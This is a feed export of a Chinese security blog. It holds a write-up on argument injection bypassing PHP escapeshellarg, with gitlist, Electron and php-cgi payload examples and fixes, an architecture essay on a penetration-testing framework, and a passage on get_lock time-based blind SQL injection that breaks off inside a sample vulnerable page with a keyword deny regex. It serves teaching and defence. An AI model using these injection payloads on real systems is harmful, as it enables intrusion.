<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description></description>
<language>zh-cn</language>
<lastBuildDate>Sat, 12 May 2018 09:41:30 +0800</lastBuildDate>
<item>
<title>谈escapeshellarg绕过与参数注入漏洞</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-05-08-36591451.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/36591451&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b381f753958bcf64068ff996bf76ca7b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;参数注入漏洞是指，在执行命令的时候，用户控制了命令中的某个参数，并通过一些危险的参数功能，达成攻击的目的。&lt;/p&gt;&lt;h2&gt;0x01 从gitlist 0.6.0远程命令执行漏洞说起&lt;/h2&gt;&lt;p&gt;我们从gitlist说起，gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本中，存在一处命令参数注入问题，可以导致远程命令执行漏洞。&lt;/p&gt;&lt;p&gt;在用户对仓库中代码进行搜索的时候，gitlist将调用&lt;code class=&quot;inline&quot;&gt;git grep&lt;/code&gt;命令：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }
    $query = escapeshellarg($query);
    try {
        $results = $this-&amp;gt;getClient()-&amp;gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);
    } catch (\RuntimeException $e) {
        return false;
    }
&lt;/code&gt;&lt;p&gt;其中，&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;是搜索的关键字，&lt;code class=&quot;inline&quot;&gt;$branch&lt;/code&gt;是搜索的分支。&lt;/p&gt;&lt;p&gt;如果用户输入的&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;的值是&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager=id;&lt;/code&gt;，将可以执行&lt;code class=&quot;inline&quot;&gt;id&lt;/code&gt;命令：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-025b25bf8f104854898807714b9dac55_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;665&quot; data-rawheight=&quot;74&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;0x02 escapeshellarg为什么没有奏效？&lt;/h2&gt;&lt;p&gt;导致这个漏洞的原因，有几点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;开发者对于&lt;code class=&quot;inline&quot;&gt;escapeshellarg&lt;/code&gt;函数的误解，造成参数注入&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;git grep&lt;/code&gt;的参数&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager&lt;/code&gt;的值，将被直接执行&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;理论上，在经过&lt;code class=&quot;inline&quot;&gt;$query = escapeshellarg($query);&lt;/code&gt;处理后，&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;将变成一个由单引号包裹的字符串。但不出漏洞的前提是，这个字符串应该出现在“参数值”的位置，而不是出现在参数选项（option）中。&lt;/p&gt;&lt;p&gt;我们可以试一下如下命令：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9e039e85772fc4b3f1b3116e17c215c5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;700&quot; data-rawheight=&quot;168&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9e039e85772fc4b3f1b3116e17c215c5&quot; data-watermark-src=&quot;v2-c6f61d88a48b22311344485e716be6ab&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;如上图，我将&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;放在了&lt;code class=&quot;inline&quot;&gt;-e&lt;/code&gt;参数的值的位置，此时它就仅仅是一个字符串而已，并不会被当成参数&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;这应该作为本漏洞的最佳修复方法，也是git官方对pattern可能是用户输入的情况的一种解决方案（以下说明来自man-page）：&lt;/p&gt;&lt;blockquote&gt;-e &lt;br&gt;The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by&lt;br&gt;or.&lt;/blockquote&gt;&lt;p&gt;当然，gitlist的开发者用了另一种修复方案：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }
    $query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);
    $query = escapeshellarg($query);
    try {
        $results = $this-&amp;gt;getClient()-&amp;gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;);
    } catch (\RuntimeException $e) {
        return false;
    }&lt;/code&gt;&lt;p&gt;首先用&lt;code class=&quot;inline&quot;&gt;preg_replace&lt;/code&gt;将&lt;code class=&quot;inline&quot;&gt;-&lt;/code&gt;开头的非法字符移除，然后将&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;拼接在&lt;code class=&quot;inline&quot;&gt;--&lt;/code&gt;的后面。&lt;/p&gt;&lt;p&gt;在命令行解析器中，&lt;code class=&quot;inline&quot;&gt;--&lt;/code&gt;的意思是，此后的部分不会再包含参数选项（option）：&lt;/p&gt;&lt;blockquote&gt;A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.&lt;br&gt;If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash&#39;s exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script.&lt;/blockquote&gt;&lt;p&gt;举个简单的例子，如果我们需要查看一个文件名是&lt;code class=&quot;inline&quot;&gt;--name&lt;/code&gt;的文件，我们就不能用&lt;code class=&quot;inline&quot;&gt;cat --name&lt;/code&gt;来读取，也不能用&lt;code class=&quot;inline&quot;&gt;cat &#39;--name&#39;&lt;/code&gt;，而必须要用&lt;code class=&quot;inline&quot;&gt;cat -- --name&lt;/code&gt;。从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-294baf61c56ec7cfecbf9d00ddfb1ecc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;215&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-294baf61c56ec7cfecbf9d00ddfb1ecc&quot; data-watermark-src=&quot;v2-288a066ec9e202cacdac47f1babf7524&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以官方这个修复方案也是可以接受的，只不过第一步的&lt;code class=&quot;inline&quot;&gt;preg_replace&lt;/code&gt;有点影响正常搜索功能。&lt;/p&gt;&lt;h2&gt;0x03 这不是PHP的专利&lt;/h2&gt;&lt;p&gt;熟悉PHP语言的同学一定对PHP执行命令的方法感受深刻，PHP内置的命令执行函数（如&lt;code class=&quot;inline&quot;&gt;shell_exec&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;system&lt;/code&gt;），都只接受一个“字符串”作为参数。而在内核中，这个字符串将被直接作为一条shell命令来调用，这种情况下就极为容易出现命令注入漏洞。&lt;/p&gt;&lt;p&gt;由于这个特点，PHP特别准备了两个过滤函数：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;escapeshellcmd&lt;/li&gt;&lt;li&gt;escapeshellarg&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;二者分工不同，前者为了防止用户利用shell的一些技巧（如分号、反引号等），执行其他命令；后者是为了防止用户的输入逃逸出“参数值”的位置，变成一个“参数选项”。&lt;/p&gt;&lt;p&gt;但我在0x02中也已经说清楚了，如果开发者在拼接命令的时候，将&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;直接给拼接在“参数选项”的位置上，那用escapeshellarg也就没任何效果了。&lt;/p&gt;&lt;p&gt;Java、Python等语言，执行命令的方法相对来说更加优雅：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import subprocess

query = &#39;id&#39;
r = subprocess.run([&#39;git&#39;, &#39;grep&#39;, &#39;-i&#39;, &#39;--line-number&#39;, query, &#39;master&#39;], cwd=&#39;/tmp/vulhub&#39;)&lt;/code&gt;&lt;p&gt;默认情况下，python的subprocess接受的是一个列表。我们可以将用户输入的query放在列表的一项，这样也就避免了开发者手工转义query的工作，也能从根本上防御命令注入漏洞。但可惜的是，python帮开发者做的操作，也仅仅相当于是PHP中的escapeshellarg。我们可以试试令query等于&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager=id;&lt;/code&gt;：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-60e865d895273fd01be970c244f0dcca_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;794&quot; data-rawheight=&quot;176&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-60e865d895273fd01be970c244f0dcca&quot; data-watermark-src=&quot;v2-57cc73211fb0b0cb22c5fef181756722&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;可见，仍然是存在参数注入漏洞的。原因还是0x02中说的原因，你把query放在了“参数选项”的位置上，无论怎么过滤，或者换成其他语言，都不可能解决问题。&lt;/p&gt;&lt;h2&gt;0x04 举一反三&lt;/h2&gt;&lt;p&gt;参数注入的例子还比较多，因为大部分的开发者都能理解命令注入的原理，但处理了命令注入后，往往都会忽略参数注入的问题。&lt;/p&gt;&lt;p&gt;最典型是案例是&lt;a href=&quot;https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/README.md&quot;&gt;Wordpress PwnScriptum漏洞&lt;/a&gt;，PHP mail函数的第五个参数，允许直接注入参数，用户通过注入&lt;code class=&quot;inline&quot;&gt;-X&lt;/code&gt;参数，导致写入任意文件，最终getshell。&lt;/p&gt;&lt;p&gt;另一个典型的例子是&lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823&quot;&gt;php-cgi CVE-2012-1823&lt;/a&gt; ，在cgi模式中，用户传入的querystring将作为cgi的参数传给php-cgi命令。而php-cgi命令可以用-d参数指定配置项，我们通过指定&lt;code class=&quot;inline&quot;&gt;auto_prepend_file=php://input&lt;/code&gt;，最终导致任意代码执行。&lt;/p&gt;&lt;p&gt;客户端上也出现过类似的漏洞，比如&lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/electron/CVE-2018-1000006&quot;&gt;Electron CVE-2018-1000006&lt;/a&gt;，我们通过注入参数&lt;code class=&quot;inline&quot;&gt;--gpu-launcher=cmd.exe /c start calc&lt;/code&gt;，来让electron内置的chromium执行任意命令。electron的最早给出的缓解措施也是在拼接点前面加上“--”。&lt;/p&gt;</description>
<author>周佩雨</author>
<guid isPermaLink="false">2018-05-08-36591451</guid>
<pubDate>Tue, 08 May 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>浅谈分布式渗透测试框架的落地实践</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-04-16-35751510.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/35751510&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-75d02d21eee1d643ab4ad34ea0c0bd33_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hash=&quot;af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hovercard=&quot;p$b$af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;安全研发工程师，现就职于长亭科技，喜欢喵喵&lt;/p&gt;&lt;blockquote&gt;“本文读起来依旧还是非常枯燥”&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x00 Intro&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本文基于上一篇文章&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28781870&quot;&gt;《浅谈分布式渗透框架的架构与设计》&lt;/a&gt;的内容，并且实践了在上一篇文章中提到的各种想法和设计，勉勉强强算是落地实现。当然意料之中地会遇到各种各样的问题，不管最后解决方案是优雅还是丑陋，对今后的工作和兴趣开发都是很有益的经验积累。本文就简单谈一些关于项目研发落地实践出现的各种矛盾和启示。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Quick Look&lt;/b&gt;：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;业务需求模型特异性 vs 原始数据多样性&lt;/li&gt;&lt;li&gt;系统设计伪需求 vs Over-Designed&lt;/li&gt;&lt;li&gt;Service-Oriented Architecture vs 耦合痛点&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;以上几个话题在下面的文章中都会涉及到，并没有先后顺序。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 业务需求模型特异性 vs 原始数据多样性&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在项目中，业务创造直接的价值，各种用户接口和相关交互都是建立在业务的基础上的；然而我们都知道，在我们文章中的这类系统有一个很大的特点：原始数据多且复杂，而且随着功能单元的增加，如果想要每一个功能单元产生的结果都能得到妥善处理，我认为有两种解决方案：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Formatter 或 API 协定：为每一个功能单元的结果（为每一类结果）都设定一个 Formatter 去直接转换为业务需求的结果；或者与原始数据约定 API。&lt;/li&gt;&lt;li&gt;数据转换协议或数据获取协议：设定数据转换协议或数据获取协议，Producer 和 Consumer 同时遵守一定规范，Producer 不需要关心 Consumer 到底想要什么样的模型，他只提供符合协议的中间模型，同样， Consumer 不关心接口怎么样，他想要的在中间模型中都可以拿得到。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;这两种方案都可以一定程度上缓解 &lt;b&gt;业务需求模型特异性与原始数据多样性之间的矛盾&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Formatter 或 API 协定&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Q：为什么这两种方式会被并列来讲？有什么关联吗？&lt;/p&gt;&lt;p&gt;A：从本质上来说，这两种方式都是多样性向特异性妥协而产生的解决方案。何谓“妥协”？与需求方沟通或者协商其实就已经算是妥协了。当然这并不是说妥协不好，毕竟沟通成本也是一大成本。&lt;/p&gt;&lt;p&gt;值得另外提的是，业务的需求方并不一定是后端的用户接口层，当然原始数据的生产者也并不一定是整个系统的底层：这样的矛盾也同样存在于前后端。传统的前后端开发，需要一定的 API 规范（可能使用 Swagger 去规范 Rest API）去处理前端业务与后端原始数据的适配，前端需要的模型的特异性同样会和后端提供原始数据产生矛盾。&lt;/p&gt;&lt;p&gt;我相信虽然说 Rest API 或者其他什么的方案会解决一部分这类前后端协作开发上的问题，但是有一个隐藏矛盾是很难处理的，也会上这一个矛盾更加严重：&lt;/p&gt;&lt;p&gt;&lt;b&gt;日益增长的客户业务方需求与现阶段旧的模型之间矛盾&lt;/b&gt;&lt;/p&gt;&lt;p&gt;其实约定固定的模型 API 或者编写固定 Formatter 这种方式，是很难解决需求增长导致的特异性加重的问题的，也就意味着：&lt;/p&gt;&lt;p&gt;&lt;b&gt;新的需求 &amp;gt;&amp;gt; 新的 API &amp;gt;&amp;gt; 新的沟通与协商&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我相信，每个 Coder 都比较想砍死需求改来改去和新需求分分钟冒出来的产品经理，对嘛？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;设定数据转换协议或者数据获取协议&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这种方法其实是可以极大程度上缓解在上一种方法中提到的&lt;/p&gt;&lt;blockquote&gt;日益增长的客户业务方需求与现阶段旧的模型之间矛盾&lt;/blockquote&gt;&lt;p&gt;Q：这种方法和上一种有什么本质区别？&lt;/p&gt;&lt;p&gt;A：表面上看其实最大的不同是增加了一个中间模型，但是恰恰是这一个中间模型，会让需求方洞悉原始数据所有可以提供的数据，并且不需要通过每一个需求都约定 API，而是直接在中间模型上构建业务模型；除非新的需求并不是在现有的原始数据上可以满足的，这个时候才需要进行沟通，扩充中间模型。本质上来说，原始数据的多样性不需要频繁向业务数据进行妥协。&lt;/p&gt;&lt;p&gt;这种解决方案其实也并不只是一种设想，在某些领域和工程应用中已经实现，并且取得了非常良好的开发体验；笔者认为这种科学的方法其实本来就已经被很好实践和理论化（Proxy-Pattern）了：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;AMQP 中 Exchange 的设计&lt;/li&gt;&lt;li&gt;GraphQL 设计&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;0x02 系统设计伪需求 vs Over-designed&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Over-designed 就是过度设计，是在进行实现的时候没有正确把握复杂度导致了多余的设计。&lt;/p&gt;&lt;p&gt;其实在这个话题中，“伪需求” 与 Over-designed 的矛盾并不只发生在调度系统中，反而是在很多地方，都会发生 Over-desighed 的问题。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;底层想提供更多的 Useless 的功能导致底层 Over-designed &lt;/li&gt;&lt;li&gt;应用服务处理不好 Infrastructures 与业务逻辑之间的关系导致 Over-designed&lt;/li&gt;&lt;li&gt;被高估的可靠性需求导致 Over-designed&lt;/li&gt;&lt;li&gt;hype-driven development&lt;/li&gt;&lt;li&gt;...&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在这个话题中，我们其实很难像第一个话题一样，提出明确的方法去缓解“伪需求”带来的 Over-designed。从一开始接触 Code 直到现在，我一直难以抛弃掉一个信念，就是对自己代码过分的高估和多业务的过分高估。我觉得这其实更多的是一种诱惑，比如 HDD（Hype-Driven Development）对我来说一直是很大的诱惑。&lt;/p&gt;&lt;p&gt;当然我在这个话题中说到的“伪需求”并不是产品经理说的“业务伪需求”，而是对系统的某一个 Feature 没有做到正确估计其紧急程度或者可靠程度，凭空给自己增加了一些“负担”。这样的问题很容易导致代码冗余，过分追求设计；或者因为自己觉得这个 Feature 相关联的别的 Feature 可能需要在不久的未来实现，而自己花了更多的精力和时间在并不是这一阶段的工作上。我管这种“伪需求”叫作“负担”其实是不太妥当的，他其实并不是真的负担，反而有时候，对于一个热爱编程的 Coder 来说，它会成为一种有毒的诱惑。&lt;/p&gt;&lt;p&gt;学会抵制诱惑不去 Over-designed，学会”大道至简“我相信对于每一个 Coder 来说都会是一个漫长的过程。&lt;/p&gt;&lt;p&gt;说到这个，可能需要再讲一个例子：微服务有一万种美好的特性，但是真的所有的系统都使用微服务就一定好吗？恐怕这里是有很大问题的。服务簇的维护需要成本，服务的研发也需要成本，科学的协议设计，配置中心，协调中心，DevOps 都需要成本。一个 Passion Coder 自然是非常热爱这种 Cloud Native 和诸多特性的新技术，但是没有团队或者团队资源不够，人不够，都没有办法支撑微服务这种高复杂度的分布式系统；另外，更需要值得思考的是，你正在开发的系统值不值得微服务？当然，可能你的需求方突然砍掉了很多很多功能，你的系统突然不需要微服务了，因此你需不需要推倒重来？还是简单转为 SOA？这些其实都是一个合格的 Coder 需要思考的问题，并不只是学习新技术，采用新特性。&lt;/p&gt;&lt;blockquote&gt;&lt;a href=&quot;https://aadrake.com/posts/2017-05-20-enough-with-the-microservices.html&quot;&gt;https://aadrake.com/posts/2017-05-20-enough-with-the-microservices.html&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;所以我管这个叫作“诱惑”，反而，越是对技术追求越多越是容易受到 Over-designed 的影响。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03 Service-Oriented Architecture vs 耦合痛点&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;耦合这个词伴随我第一次程序设计课程一直到现在，从微观代码的类之间的耦合一直到服务之间耦合，设计上的耦合，甚至配置之间的耦合，一步一步走来；从思考中，也有了很多解决方法，不管有没有付诸实现，我觉得这些都是很有价值的值得讨论的问题。&lt;/p&gt;&lt;p&gt;本文描述的场景是结合上一篇文章使用了消息队列作为通信基础服务，服务之间通信需要通过消息队列。因此，基本上所有的服务之间的耦合应该是必须有通信协议耦合的，这是必须的，我们在这个 Topic 中讨论其他的问题：&lt;/p&gt;&lt;h2&gt;&lt;b&gt;不能在数据模型上耦合&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;A：“我负责的这个服务的数据怎么传给你呢？”&lt;br&gt;B：“要不我把 Postgres 的端口暴露出来，你直接写到数据库吧”&lt;br&gt;A：“Models 就看 Git 上我的代码，COPY 到你那里就可以”&lt;br&gt;完成之后，过了几天，因为需求变动，数据模型需要修改……&lt;br&gt;B：“我需要改 Models，你那里可能也需要改改代码”&lt;br&gt;A：“…猫猫碰.jpg”&lt;br&gt;B：“我的 Migration 怎么老有问题？是不是 A 动了 Models？”&lt;br&gt;A：“..不，我没有，别瞎说啊.jpg”&lt;/blockquote&gt;&lt;p&gt;这样的对话，确确实实是现实中发生的，这个数据模型牵扯到了两个不同的服务在开发过程中，定义的修改，Feature 和需求的增加，都会导致直接的与这个模型相关联的服务的代码的改动；造成这样的问题只是起初为了方便两个服务之间传输数据。&lt;/p&gt;&lt;p&gt;那么既然已经有了通信系统，为什么不能用来定义通信协议来传输数据呢，维护一套耦合方式总要比同时兼顾通信协议和数据库更轻松吧。另外在数据库耦合会造成更多奇奇怪怪的问题，比如：一方使用 ORM 一方没有使用 ORM，或者双方 ORM 对数据库不同的操作导致冲突，甚至说任意一个服务在数据库操作上的小问题都会影响到其他服务。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;配置中心的必要性&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;A：“需要测试环境改点配置，我们的 MQ 服务器迁移了”&lt;br&gt;B：“那么几个节点的配置可能都需要改动之后重新启动”&lt;br&gt;A：“Orz……求一发批量操作脚本”&lt;/blockquote&gt;&lt;p&gt;我想不只是我们，可能所有的项目都会遇到这种问题，内网一个服务的迁移直接导致了大批配置文件需要改动；某一项配置的改动，需要牵连一大批配置文件内容的修改。&lt;/p&gt;&lt;p&gt;当然，IP 迁移的问题相对来说还是比较好解决的，只需要内网 DNS 可以解析到新迁移的机器上就可以了；但是某一项配置的改动导致的关联问题，可并不是那么容易能解决的。&lt;/p&gt;&lt;p&gt;当然也并不是没有办法解决：配置中心和正确的配置中心客户端就可以解决这种问题。（如果你的配置中心也要迁移，那就爱莫能助了吧）&lt;/p&gt;&lt;p&gt;配置中心其实也并不只是可以用来关系配置，服务的注册，自动发现，甚至一些服务基础信息的同步，集群管理都可以通过配置中心来做。在实践中，Etcd 和 Zookeeper 应用的相对比较多，以 Zookeeper 为例，在我个人的使用中其实无所谓你本身应用服务究竟是什么语言编写，Zookeeper 客户端一般都有相应的语言绑定，在 acl 和 ZK 配置得当的情况下，完全可以做到保持配置文件或者关键数据在分布式系统中的一致性，热更新，热迁移，并且保证一定的安全性。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;公共代码的耦合与 Infrastructure&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;除了上面提到的更多的上层的耦合的问题，在大型项目中代码的耦合问题虽然更不引人注意，但是可能存在的隐患依然是充满威胁。最具有代表性的例子其实就是一些基础设施公用库的问题，这些封装成了公共库的代码其实也是在迭代更新的，因此，如果说因为某一个服务的特殊需求导致公用代码的接口变动，可能会导致其他服务使用公用库的代码也要发生变动。&lt;/p&gt;&lt;p&gt;但是也并不意味着这样的问题是难以避免的，就公用代码而言，要避免这种尴尬的问题，比较好的方式其实是锁版本。没错，内部公用的代码库的发布也应该是有版本的，在一个服务 Stable 的时候，他的使用的公用代码库和基础设施的库一样都是锁定版本，避免因为公用代码的更新导致服务出现异常。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 Outro&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然在实际的项目中，遇到的问题并不只这么多。在本文我只是特意选择了三个很具有代表性的方面来发表一些自己拙劣的见解，希望可以抛砖引玉，引来大佬一起交流 ;-)&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-04-16-35751510</guid>
<pubDate>Mon, 16 Apr 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>一种新型SQL时间盲注攻击探索</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-04-03-35245598.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/35245598&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0cd460758b08a7f1950d7ee754c468f5_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/879a0dd1ccf71649de0eeb3327f42f59&quot; data-hash=&quot;879a0dd1ccf71649de0eeb3327f42f59&quot; data-hovercard=&quot;p$b$879a0dd1ccf71649de0eeb3327f42f59&quot;&gt;@do9gy&lt;/a&gt; &lt;/p&gt;&lt;p&gt;现就职于长亭科技，长期从事渗透测试，WAF攻防对抗工作，喜欢小狗。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;SQL注入漏洞由来已久，关于盲注方面一直都是安全爱好者喜欢研究的话题。记得最早了解到DNS外传的思路是在oldjun的博客，当时被这种技巧所吸引，不过该方法依赖于mysql版本和window环境的限制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;首先介绍一下什么是SQL盲注&lt;/h2&gt;&lt;blockquote&gt;在SQL注入中，往往需要引入“超出预期”的SQL语句，最好是希望将“额外”的查询内容直接显示在页面上，使用的手法有：“报错查询（error-based）”、“联合查询（union-select）”。对于无法直接回显出内容的情况需要依赖true／false差异判断（boolean）、时间对比（time-based）、DNS外传数据查询（data exfiltration through DNS channel）等方法进行捕获。例如：“select if(user()=&#39;root@localhost&#39;,sleep(4),null)“ 当网站用户是”root@localhost“时，会延长4秒钟后返回结果，当用户不是”root@localhost“时，会立即返回，由此可以判断系统中的用户，利用同样的方法可以猜测出权限范围内所有数据库所有表中存放的内容。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;关于mysql时间类型（time-based）的注入，一直以来众所周知的有三种方法——sleep、benchmark、笛卡尔积。所以许多市面上的WAF产品也是基于此类规则去防护的。&lt;/p&gt;&lt;p&gt;但是sql时间类型的盲注本质是&lt;b&gt;利用插入的SQL语句执行造成时间延迟&lt;/b&gt;，所以只要可以大于平均网络延迟2倍以上，就可以作为执行成功的判断依据，而大多数网站的平均响应时间在100ms以内，所以我们需要制造能达到200ms以上的时间延长的语句。&lt;/p&gt;&lt;p&gt;今天我们要提到的一个mysql函数是 get_lock函数，先来看一下mysql文档中对其的描述：&lt;/p&gt;&lt;p&gt;GET_LOCK(str,timeout)&lt;/p&gt;&lt;p&gt;Tries&lt;br&gt;to obtain a lock with a name given by the string str, using a timeout of&lt;br&gt;timeout seconds. A negative timeout value means infinite timeout. The lock is&lt;br&gt;exclusive. While held by one session, other sessions cannot obtain a lock of&lt;br&gt;the same name.&lt;/p&gt;&lt;p&gt;在一个session中可以先锁定一个变量例如：select get_lock(‘do9gy’,1)&lt;/p&gt;&lt;p&gt;然后通过另一个session 再次执行get_lock函数 select get_lock(‘do9gy’,5),此时会产生5 秒的延迟，其效果类似于sleep(5)。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;mysql&amp;gt; select get_lock(&#39;do9gy&#39;,1);
+---------------------+
| get_lock(&#39;do9gy&#39;,1) |
+---------------------+
|                   1 |
+---------------------+
1 row in set (0.00 sec)

mysql&amp;gt; select get_lock(&#39;do9gy&#39;,5);
+---------------------+
| get_lock(&#39;do9gy&#39;,5) |
+---------------------+
|                   0 |
+---------------------+
1 row in set (5.00 sec)
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;于是我们可以，将此方法用于SQL注入的判断，但是利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。&lt;/p&gt;&lt;p&gt;下面我们给出一个示例：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php
require &#39;conn.php&#39;;
$id = $_GET[&#39;id&#39;];
if(preg_match(&quot;/(sleep|benchmark|outfile|dumpfile|load_file|join)/i&quot;, $_GET[&#39;id&#39;]))
{
    die(&quot;403 forbidden!&quot;);
}
$sql = &quot;select * from article where id=&#39;&quot;.intval($id).&quot;&#39;&quot;;
$res = mysql_query($sql);
if(!$res){
    die(&quot;404 not found!&quot;);
